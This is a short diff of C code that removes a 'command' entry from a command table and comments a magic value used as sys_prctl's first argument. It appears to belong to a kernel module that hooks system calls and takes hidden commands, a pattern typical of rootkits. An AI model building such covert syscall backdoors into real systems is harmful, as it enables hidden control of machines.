@@ -12,10 +12,6 @@ struct iface_command {
 
 static struct iface_command iface__commands[7] = {
   (struct iface_command) {
-    .command = "command",
-    .handler = (iface_command_handler_t) &command
-  },
-  (struct iface_command) {
     .command = "drop",
     .handler = (iface_command_handler_t) &drop
   },
@@ -46,6 +42,7 @@ static struct sctm_hook iface__hook = {
   /* `.hooked` is zeroed by the compiler */
   .unhook_method = SCTM_UNHOOK_METHOD_REPLACE
 };
+/* unlikely value for `sys_prctl`'s first argument */
 static unsigned long iface__secret = 0xDEADBEEFDEADBEEF;
 
 /*
